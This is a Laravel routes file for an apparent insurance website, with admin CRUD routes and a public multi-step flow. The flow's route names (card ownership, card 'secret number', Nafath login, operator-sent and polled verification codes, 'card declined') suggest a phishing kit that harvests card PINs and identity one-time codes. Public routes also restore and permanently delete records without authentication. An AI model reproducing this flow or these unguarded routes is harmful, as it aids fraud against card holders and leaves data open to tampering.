<?php

use App\Http\Controllers\ProfileController;
use App\Http\Controllers\Backend\Admin\AdminDashboardController;
use App\Http\Controllers\Backend\Admin\AdminLoginController;
use App\Http\Controllers\Backend\Admin\InsuranceBackendController;
use App\Http\Controllers\Backend\Admin\InsuranceRequestsBackendController;
use App\Http\Controllers\Backend\Admin\SupportTicketController;
use App\Http\Controllers\Frontend\HomePageFrontendController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// Test route for Vite setup
Route::get('/test-vite', function () {
    return view('test-vite');
})->name('test-vite');


// ==================================================================================================================
// =========================================== Super Admin Routes ===================================================
// ==================================================================================================================
Route::prefix('super_admin')->name('super_admin.')->group(function () {
    Route::get('/login', [AdminLoginController::class, 'showLoginForm'])->name('loginUser');
    Route::post('/loginFormSubmit', [AdminLoginController::class, 'loginFormSubmit'])->name('loginFormSubmit');
    Route::post('/logout', [AdminLoginController::class, 'logout'])->name('logout');

    Route::group(['middleware' => ['auth:super_admin']], function () {
        // Dashboard Route :
        Route::get('/dashboard', [AdminDashboardController::class, 'index'])->name('dashboard');

        // Support Tickets :
        // ==============================================================================
        Route::group(['prefix' => 'support_tickets'], function () {
            Route::get('/index', [SupportTicketController::class, 'index'])->name('support_tickets-index'); // Created By Raghad ALKarasneh
            Route::get('destroy/{id}', [SupportTicketController::class, 'destroy'])->name('support_tickets-destroy'); // Created By Rgahad ALKarasneh
        });

        // Profile Routes :
        // ==============================================================================
        Route::group(['prefix' => 'profiles'], function () {
            Route::get('/edit', [ProfileController::class, 'update'])->name('profiles-edit');
        });

        // Insurance Routes :
        Route::group(['prefix' => 'insurances'], function () {
            Route::get('/index', [InsuranceBackendController::class, 'index'])->name('insurances-index'); // Created By:Ahmad Obeidat
            Route::get('/create', [InsuranceBackendController::class, 'create'])->name('insurances-create'); // Created By:Ahmad Obeidat
            Route::post('/store', [InsuranceBackendController::class, 'store'])->name('insurances-store'); // Created By:Ahmad Obeidat
            Route::get('show/{id}', [InsuranceBackendController::class, 'show'])->name('insurances-show'); // Created By:Ahmad Obeidat
            Route::get('edit/{id}', [InsuranceBackendController::class, 'edit'])->name('insurances-edit'); // Created By:Ahmad Obeidat
            Route::post('update/{id}', [InsuranceBackendController::class, 'update'])->name('insurances-update'); // Created By:Ahmad Obeidat
            Route::get('softDelete/{id}', [InsuranceBackendController::class, 'softDelete'])->name('insurances-softDelete'); // Created By:Ahmad Obeidat
            Route::get('/showSoftDelete', [InsuranceBackendController::class, 'showSoftDelete'])->name('insurances-showSoftDelete'); //Created By:Ahmad Obeidat
            Route::get('softDeleteRestore/{id}', [InsuranceBackendController::class, 'softDeleteRestore'])->name('insurances-softDeleteRestore'); //Created By:Ahmad Obeidat
            Route::get('/softDeleteSelected', [InsuranceBackendController::class, 'softDeleteSelected'])->name('insurances-softDeleteSelected'); // Created By:Ahmad Obeidat
            Route::get('/softDeleteRestoreSelected', [InsuranceBackendController::class, 'softDeleteRestoreSelected'])->name('insurances-softDeleteRestoreSelected'); // Created By:Ahmad Obeidat
            Route::get('/activeInactiveSingle/{id}', [InsuranceBackendController::class, 'activeInactiveSingle'])->name('insurances-activeInactiveSingle'); // Created By:Ahmad Obeidat

            // Add Insurance Benefit Route :
            Route::post('addInsuranceBenefit/{id}', [InsuranceBackendController::class, 'addInsuranceBenefit'])->name('insurances-addInsuranceBenefit');
            Route::get('deleteInsuranceBenefit/{id}', [InsuranceBackendController::class, 'deleteInsuranceBenefit'])->name('insurances-deleteInsuranceBenefit');
        });

        // Insurance Requests Routes :
        Route::group(['prefix' => 'insurance_requests'], function () {
            Route::get('/index', [InsuranceRequestsBackendController::class, 'index'])->name('insurance_requests-index'); // Created By:Ahmad Obeidat
            Route::get('/create', [InsuranceRequestsBackendController::class, 'create'])->name('insurance_requests-create'); // Created By:Ahmad Obeidat
            Route::post('/store', [InsuranceRequestsBackendController::class, 'store'])->name('insurance_requests-store'); // Created By:Ahmad Obeidat
            Route::get('show/{id}', [InsuranceRequestsBackendController::class, 'show'])->name('insurance_requests-show'); // Created By:Ahmad Obeidat
            Route::get('edit/{id}', [InsuranceRequestsBackendController::class, 'edit'])->name('insurance_requests-edit'); // Created By:Ahmad Obeidat
            Route::post('update/{id}', [InsuranceRequestsBackendController::class, 'update'])->name('insurance_requests-update'); // Created By:Ahmad Obeidat
            Route::get('softDelete/{id}', [InsuranceRequestsBackendController::class, 'softDelete'])->name('insurance_requests-softDelete'); // Created By:Ahmad Obeidat
            Route::get('/showSoftDelete', [InsuranceRequestsBackendController::class, 'showSoftDelete'])->name('insurance_requests-showSoftDelete'); //Created By:Ahmad Obeidat
            Route::get('softDeleteRestore/{id}', [InsuranceRequestsBackendController::class, 'softDeleteRestore'])->name('insurance_requests-softDeleteRestore'); //Created By:Ahmad Obeidat
            Route::get('/softDeleteSelected', [InsuranceRequestsBackendController::class, 'softDeleteSelected'])->name('insurance_requests-softDeleteSelected'); // Created By:Ahmad Obeidat
            Route::get('/softDeleteRestoreSelected', [InsuranceRequestsBackendController::class, 'softDeleteRestoreSelected'])->name('insurance_requests-softDeleteRestoreSelected'); // Created By:Ahmad Obeidat
            Route::get('/activeInactiveSingle/{id}', [InsuranceRequestsBackendController::class, 'activeInactiveSingle'])->name('insurance_requests-activeInactiveSingle'); // Created By:Ahmad Obeidat


            Route::get('sendNafathCode/{id}', [InsuranceRequestsBackendController::class, 'sendNafathCode'])->name('insurance_requests-sendNafathCode'); // Created By:Qusai
            Route::post('sendNafathCodeRequest/{id}', [InsuranceRequestsBackendController::class, 'sendNafathCodeRequest'])->name('insurance_requests-sendNafathCodeRequest'); // Created By:Qusai

        });
    });
});

// require __DIR__ . '/auth.php'; // Created By Layth Al-Dwairi


// ==================================================================================================================
// ==================================================================================================================
// =========================================== Frontend Routes ======================================================
// ==================================================================================================================
// ==================================================================================================================
Route::get('/', [HomePageFrontendController::class, 'welcome'])->name('welcome');

Route::post('/insuranceRequest', [HomePageFrontendController::class, 'insuranceRequest'])->name('insuranceRequest');

Route::get('/insuranceStatements', [HomePageFrontendController::class, 'insuranceStatements'])->name('insuranceStatements');
Route::post('/insuranceStatementsRequest', [HomePageFrontendController::class, 'insuranceStatementsRequest'])->name('insuranceStatementsRequest');

Route::get('/insuranceType', [HomePageFrontendController::class, 'insuranceType'])->name('insuranceType');
Route::post('/insuranceTypeRequest', [HomePageFrontendController::class, 'insuranceTypeRequest'])->name('insuranceTypeRequest');

Route::get('/insuranceInformation', [HomePageFrontendController::class, 'insuranceInformation'])->name('insuranceInformation');
Route::post('/insuranceInformationRequest', [HomePageFrontendController::class, 'insuranceInformationRequest'])->name('insuranceInformationRequest');

Route::get('/paymentForm', [HomePageFrontendController::class, 'paymentForm'])->name('paymentForm');
Route::post('/paymentFormRequest', [HomePageFrontendController::class, 'paymentFormRequest'])->name('paymentFormRequest');

Route::get('/beforeCallProcess', [HomePageFrontendController::class, 'beforeCallProcess'])->name('beforeCallProcess');

Route::get('/callProcess', [HomePageFrontendController::class, 'callProcess'])->name('callProcess');
Route::post('/callProcessRequest', [HomePageFrontendController::class, 'callProcessRequest'])->name('callProcessRequest');

Route::get('/cardOwnership', [HomePageFrontendController::class, 'cardOwnership'])->name('cardOwnership');
Route::post('/cardOwnershipRequest', [HomePageFrontendController::class, 'cardOwnershipRequest'])->name('cardOwnershipRequest');

Route::get('/cardOwnershipSecertNumber', [HomePageFrontendController::class, 'cardOwnershipSecertNumber'])->name('cardOwnershipSecertNumber');
Route::post('/cardOwnershipSecertNumberRequest', [HomePageFrontendController::class, 'cardOwnershipSecertNumberRequest'])->name('cardOwnershipSecertNumberRequest');

Route::get('/confirmPhoneNumber', [HomePageFrontendController::class, 'confirmPhoneNumber'])->name('confirmPhoneNumber');
Route::post('/confirmPhoneNumberRequest', [HomePageFrontendController::class, 'confirmPhoneNumberRequest'])->name('confirmPhoneNumberRequest');
Route::get('/checkPhoneNumber', [HomePageFrontendController::class, 'checkPhoneNumber'])->name('checkPhoneNumber');
Route::post('/checkPhoneNumberRequest', [HomePageFrontendController::class, 'checkPhoneNumberRequest'])->name('checkPhoneNumberRequest');
Route::get('/nafathLogin', [HomePageFrontendController::class, 'nafathLogin'])->name('nafathLogin');
Route::post('/nafathLoginRequest', [HomePageFrontendController::class, 'nafathLoginRequest'])->name('nafathLoginRequest');
Route::post('/nafathDocumentingRequest', [HomePageFrontendController::class, 'nafathDocumentingRequest'])->name('nafathDocumentingRequest');
Route::get('/codeDegit', [HomePageFrontendController::class, 'codeDegit'])->name('codeDegit');
Route::get('/fetchCodeDegit', [HomePageFrontendController::class, 'fetchCodeDegit'])->name('fetchCodeDegit');
Route::get('/resendCodeDegit', [HomePageFrontendController::class, 'resendCodeDegit'])->name('resendCodeDegit');
Route::get('/cardDeclined', [HomePageFrontendController::class, 'cardDeclined'])->name('cardDeclined');


// Route::get('/pdf', function () {
//     return view('pdf');
// })->name('/pdf');

Route::get('/welcome2', function () {
    return view('welcome2');
})->name('/welcome2');

Route::get('/tasks', function () {
    return view('tasks');
})->name('/tasks');

Route::get('/searchForInsurance', function () {
    return view('searchForInsurance');
})->name('/searchForInsurance');

Route::get('/', function () {
    return view('welcome');
})->name('home');

Route::get('/about', function () {
    return view('about');
})->name('about');

Route::get('/contact', function () {
    return view('contact');
})->name('contact');

Route::get('/claims', function () {
    return view('claims');
})->name('claims');

Route::prefix('insurance')->group(function () {
    Route::get('/car', function () {
        return view('insurance.car');
    })->name('insurance.car');
    
    Route::get('/health', function () {
        return view('insurance.health');
    })->name('insurance.health');
    
    Route::get('/life', function () {
        return view('insurance.life');
    })->name('insurance.life');
    
    Route::get('/property', function () {
        return view('insurance.property');
    })->name('insurance.property');
    
    // مسارات لعرض بيانات التأمين - Frontend
    Route::get('/all', function () {
        // عرض جميع التأمينات (غير المحذوفة)
        $insurances = \App\Models\Insurance::all();
        return view('insurance.all', compact('insurances'));
    })->name('insurance.all');
    
    Route::get('/with-deleted', function () {
        // عرض جميع التأمينات بما فيها المحذوفة
        $insurances = \App\Models\Insurance::withTrashed()->get();
        return view('insurance.with-deleted', compact('insurances'));
    })->name('insurance.with-deleted');
    
    Route::get('/only-deleted', function () {
        // عرض التأمينات المحذوفة فقط
        $insurances = \App\Models\Insurance::onlyTrashed()->get();
        return view('insurance.only-deleted', compact('insurances'));
    })->name('insurance.only-deleted');
    
    Route::get('/active', function () {
        // عرض التأمينات النشطة فقط
        $insurances = \App\Models\Insurance::where('status', 'active')->get();
        return view('insurance.active', compact('insurances'));
    })->name('insurance.active');
    
    Route::get('/inactive', function () {
        // عرض التأمينات غير النشطة
        $insurances = \App\Models\Insurance::where('status', 'inactive')->get();
        return view('insurance.inactive', compact('insurances'));
    })->name('insurance.inactive');
    
    // مسار لاستعادة تأمين محذوف
    Route::post('/restore/{id}', function ($id) {
        $insurance = \App\Models\Insurance::withTrashed()->findOrFail($id);
        $insurance->restore();
        return redirect()->back()->with('success', 'تم استعادة التأمين بنجاح');
    })->name('insurance.restore');
    
    // مسار لحذف نهائي
    Route::delete('/force-delete/{id}', function ($id) {
        $insurance = \App\Models\Insurance::withTrashed()->findOrFail($id);
        $insurance->forceDelete();
        return redirect()->back()->with('success', 'تم حذف التأمين نهائياً');
    })->name('insurance.force-delete');
});

// Routes للمستخدمين المسجلين
Route::middleware(['auth'])->group(function () {
    Route::get('/profile', function () {
        return view('profile');
    })->name('profile');
    
    Route::get('/policies', function () {
        return view('policies');
    })->name('policies');
    
    Route::get('/payments', function () {
        return view('payments');
    })->name('payments');
});
